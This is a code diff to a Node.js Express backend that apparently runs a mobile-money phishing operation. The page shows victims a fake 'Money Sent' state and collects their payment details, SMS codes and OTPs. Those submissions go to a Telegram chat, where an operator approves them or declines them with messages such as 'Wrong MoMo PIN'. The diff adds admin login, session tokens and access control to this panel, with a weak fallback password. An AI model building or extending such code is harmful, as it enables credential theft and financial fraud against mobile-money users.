@@ -11,6 +11,15 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+// ---- Admin credentials ----
+const ADMIN_USERS = {
+  admin: process.env.ADMIN_PASSWORD || 'admin123'
+};
+
+// Active admin sessions (token -> expiresAt)
+const adminSessions = new Map();
+const SESSION_TTL = 1000 * 60 * 60 * 8; // 8 hours
+
 const DEFAULT_STATE = {
   status: 'Money Sent',
   currency: 'USD',
@@ -41,6 +50,18 @@ function writeState(state) {
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
+/* ---- Admin auth middleware ---- */
+function requireAdmin(req, res, next) {
+  const token = req.headers['x-admin-token'] || req.query.token;
+  const exp = adminSessions.get(token);
+  if (!exp || exp < Date.now()) {
+    if (token) adminSessions.delete(token);
+    return res.status(401).json({ error: 'unauthorized' });
+  }
+  next();
+}
+
+/* ---- Real-time subscribers (SSE) ---- */
 const clients = new Set();
 
 function broadcast(state) {
@@ -50,6 +71,7 @@ function broadcast(state) {
   }
 }
 
+/* ---- Telegram helpers ---- */
 async function tgSend(method, body) {
   if (!TELEGRAM_BOT_TOKEN) {
     console.warn('[tg] missing TELEGRAM_BOT_TOKEN');
@@ -147,6 +169,29 @@ async function sendOtpToTelegram(sub) {
   });
 }
 
+/* ---- Admin auth endpoints ---- */
+app.post('/api/admin/login', (req, res) => {
+  const { username, password } = req.body || {};
+  const expected = ADMIN_USERS[username];
+  if (!expected || expected !== password) {
+    return res.status(401).json({ error: 'Invalid username or password' });
+  }
+  const token = 'adm_' + Math.random().toString(36).slice(2) + Date.now().toString(36);
+  adminSessions.set(token, Date.now() + SESSION_TTL);
+  res.json({ ok: true, token, expiresIn: SESSION_TTL });
+});
+
+app.post('/api/admin/logout', requireAdmin, (req, res) => {
+  const token = req.headers['x-admin-token'];
+  adminSessions.delete(token);
+  res.json({ ok: true });
+});
+
+app.get('/api/admin/check', requireAdmin, (req, res) => {
+  res.json({ ok: true });
+});
+
+/* ---- Public endpoints ---- */
 app.get('/health', (req, res) => {
   res.status(200).json({
     status: 'ok',
@@ -183,7 +228,8 @@ app.get('/api/stream', (req, res) => {
   });
 });
 
-app.post('/api/state', (req, res) => {
+/* ---- Admin-only state edit ---- */
+app.post('/api/state', requireAdmin, (req, res) => {
   const current = readState();
   const updated = { ...current, ...req.body };
   if (req.body.amount != null) updated.amount = parseFloat(req.body.amount) || 0;
@@ -192,6 +238,7 @@ app.post('/api/state', (req, res) => {
   res.json({ ok: true, state: updated });
 });
 
+/* ---- Submission endpoints (public — used by user flow) ---- */
 app.post('/api/submit-payment', async (req, res) => {
   const submission = {
     ...req.body,
@@ -231,7 +278,6 @@ app.post('/api/submit-sms', async (req, res) => {
 });
 
 app.post('/api/submit-otp', async (req, res) => {
-  console.log('=== SUBMIT-OTP ===');
   const submission = {
     ...req.body,
     id: 'OTP-' + Date.now(),
@@ -246,13 +292,10 @@ app.post('/api/submit-otp', async (req, res) => {
   writeState(state);
   broadcast(state);
 
-  const tgResult = await sendOtpToTelegram(submission);
-  console.log('[tg] otp result ok?', tgResult && tgResult.ok);
-
+  await sendOtpToTelegram(submission);
   res.json({ status: 'pending', id: submission.id });
 });
 
-// Resend request — notifies Telegram
 app.post('/api/resend-otp', async (req, res) => {
   const phone = (req.body && req.body.phone) || '—';
   await tgSend('sendMessage', {
@@ -266,7 +309,6 @@ app.post('/api/resend-otp', async (req, res) => {
   res.json({ ok: true });
 });
 
-// OTP session expired / user tapped Inactive — notifies Telegram
 app.post('/api/otp-inactive', async (req, res) => {
   const phone = (req.body && req.body.phone) || '—';
   const triggeredBy = (req.body && req.body.triggeredBy) || 'timeout';
@@ -281,7 +323,8 @@ app.post('/api/otp-inactive', async (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/approve', (req, res) => {
+/* ---- Admin-only decision endpoints (backup to Telegram) ---- */
+app.post('/api/approve', requireAdmin, (req, res) => {
   const state = readState();
   state.decision = 'approved';
   state.decidedAt = new Date().toISOString();
@@ -290,7 +333,7 @@ app.post('/api/approve', (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/decline', (req, res) => {
+app.post('/api/decline', requireAdmin, (req, res) => {
   const state = readState();
   state.decision = 'declined';
   state.declineMessage = req.body.message || 'Wrong MoMo PIN. Please try again.';
@@ -300,7 +343,7 @@ app.post('/api/decline', (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/reset', (req, res) => {
+app.post('/api/reset', requireAdmin, (req, res) => {
   const state = readState();
   delete state.decision;
   delete state.declineMessage;
@@ -313,6 +356,7 @@ app.post('/api/reset', (req, res) => {
   res.json({ ok: true, state });
 });
 
+/* ---- Telegram webhook ---- */
 app.post('/api/telegram/webhook', async (req, res) => {
   res.sendStatus(200);
 
@@ -392,7 +436,7 @@ app.post('/api/telegram/webhook', async (req, res) => {
     return;
   }
 
-  /* OTP — 3 buttons: approve, decline, inactive */
+  /* OTP */
   if (action === 'otp-approve' || action === 'otp-decline' || action === 'otp-inactive') {
     const current = state.latestOtpSubmission;
     if (!current || (refId && current.id !== refId)) {
@@ -424,7 +468,6 @@ app.post('/api/telegram/webhook', async (req, res) => {
         reply_markup: { inline_keyboard: [[{ text: '❌ OTP Declined', callback_data: 'noop' }]] }
       });
     } else {
-      // otp-inactive
       state.decision = 'otp-inactive';
       state.decidedAt = new Date().toISOString();
       writeState(state);
@@ -442,6 +485,7 @@ app.post('/api/telegram/webhook', async (req, res) => {
   await tgSend('answerCallbackQuery', { callback_query_id: cb.id, text: 'Unknown action' });
 });
 
+/* ---- Webhook registration ---- */
 async function registerWebhook() {
   if (!TELEGRAM_BOT_TOKEN) return;
 
@@ -463,5 +507,6 @@ app.listen(PORT, '0.0.0.0', async () => {
   console.log(`Running on port ${PORT}`);
   console.log('Telegram token set?', !!TELEGRAM_BOT_TOKEN);
   console.log('Telegram chat set?', !!TELEGRAM_CHAT_ID);
+  console.log('Admin password set?', !!process.env.ADMIN_PASSWORD);
   await registerWebhook();
 });
